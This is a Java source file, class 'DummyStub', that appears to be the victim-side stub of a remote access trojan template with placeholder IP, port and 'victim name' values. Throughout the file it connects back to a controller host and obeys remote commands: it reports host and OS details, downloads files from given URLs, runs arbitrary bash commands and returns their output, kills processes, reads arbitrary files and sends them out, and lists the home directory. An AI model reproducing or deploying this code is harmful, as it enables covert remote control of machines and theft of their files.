package Application;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

public class DummyStub {
private static final String IP = "IPAddress";
private static final int PORT = PORTNumber;
private static final String VicName = "VicTimName";
public static String ProcessName;
public static void main(String[] args) {
	try {
		Socket s = new Socket(IP,PORT);
		PrintWriter writer = new PrintWriter(s.getOutputStream());
		BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));
		while(true) {
			String sel = reader.readLine();
			switch(sel) {
			case "PING": writer.println(s.getRemoteSocketAddress());
			             writer.flush();
			             break;
			case "CLOSE": s.close();
			              return;
			              
			case "INFO": InetAddress addr = InetAddress.getLocalHost();
		                   writer.println(" Victim ID        : " +  VicName+ "\n"
                                        + " Victim Name      : " + addr.getHostName() + "\n"
			                            + " Opretaing System : " + System.getProperty("os.name") + "\n"
		                		        + " IP Address       : " + s.getRemoteSocketAddress() + "\n"
		                                + " Version          : " + "2.0 Public EditionT ");
			               writer.flush();
			               break;
			               
			case "Download":
                           DownloadFile(reader.readLine(),reader.readLine());
                           writer.println("  [-] File has been downloaded.");
                           writer.flush();
                           break;
			case "Eecx": 
		         		String EveryThing2 = ExecuteCommads(reader.readLine());
			            int NumberOfLine2 = GetLines("execute.txt");
                        System.out.println(NumberOfLine2);
                        System.out.println(EveryThing2);
                        writer.println(NumberOfLine2);
                        writer.println(EveryThing2);
                        File Output = new File("execute.txt");
                        Output.delete();
                        writer.flush();
                        break;
                        
			case "Kill":    ProcessName = reader.readLine(); 
		                	KillProcess();
			                writer.println("  [-] Process Kill has been executed.");
			                writer.flush();
			                break;
			case "GetText": String FilePath = reader.readLine();
			                int NumberOfLine = GetLines(FilePath);
			                System.out.println(NumberOfLine);
                            String EveryThing = GetText(FilePath);
                            writer.println(NumberOfLine);
                            writer.println(EveryThing);
                            writer.flush();
                            break;
			case "GetHome":String EveryThing1 = GetHome();
				            int NumberOfLine1 = GetLines("lsputput.txt");
                            System.out.println(NumberOfLine1);
                            System.out.println(EveryThing1);
                            writer.println(NumberOfLine1);
                            writer.println(EveryThing1);
                            writer.flush();
                            break;
			default: break;

			}
				
			}
	} catch (Exception e) {};
}

public static void DownloadFile(String DownloadURL,String DownloadPath) throws IOException {
	URL website = new URL(DownloadURL);
	ReadableByteChannel rbc = Channels.newChannel(website.openStream());
	FileOutputStream fos = new FileOutputStream(DownloadPath);
	fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
}

public static int GetLines(String FilePath) throws IOException {
	List<String> lines = Files.readAllLines(Paths.get(FilePath), Charset.defaultCharset());
	int noOfLines = lines.size();
	return noOfLines;
}

public static String ExecuteCommads(String Command) throws IOException, InterruptedException {
	   Process p = Runtime.getRuntime().exec(new String[]{"bash","-c",Command});
	   BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
	   System.out.println(b.readLine());
		      StringBuilder sb = new StringBuilder();
		      String line = b.readLine();
		      while ((line = b.readLine()) != null) {
		          sb.append(line);
		          sb.append(System.lineSeparator());
		          line = b.readLine();
		      }	      
		      String everything = sb.toString();
			  PrintWriter out = new PrintWriter("execute.txt");
		      out.println(everything);
		      System.out.println(everything);
		      out.close();
		      return everything;			  
}


public static String GetText(String FilePath) throws IOException {
	  BufferedReader br = new BufferedReader(new FileReader(FilePath));
	  try {
	      StringBuilder sb = new StringBuilder();
	      String line = br.readLine();

	      while (line != null) {
	          sb.append(line);
	          sb.append(System.lineSeparator());
	          line = br.readLine();
	      }
	      String everything = sb.toString();
	      System.out.println(everything);
		  return everything;
	  } finally {
	      br.close();
	  }

}
public static void KillProcess() throws IOException {
		if (System.getProperty("os.name").contains("windows") == true) {
			Runtime.getRuntime().exec("taskkill /IM " + ProcessName + "/F" );
		} else if (System.getProperty("os.name").contains("linux") == true) {
			Runtime.getRuntime().exec("killall " + ProcessName);
		} else if (System.getProperty("os.name").contains("mac")) {
			Runtime.getRuntime().exec("killall " + ProcessName);
		}
	}
public static String GetHome() throws IOException {
	   Process p = Runtime.getRuntime().exec(new String[]{"bash","-c","cd ~ && ls -all"});
	   BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
	   //System.out.println(b.readLine());
	   try {
		      StringBuilder sb = new StringBuilder();
		      String line = b.readLine();
		      while ((line = b.readLine()) != null) {
		          sb.append(line);
		          sb.append(System.lineSeparator());
		          line = b.readLine();
		      }	      
		      String everything = sb.toString();
		      System.out.println(everything);
			  PrintWriter out = new PrintWriter("lsputput.txt");
		      out.println(everything);
		      out.close();
		      return everything;
		  } finally {
			  
		  }
}
}
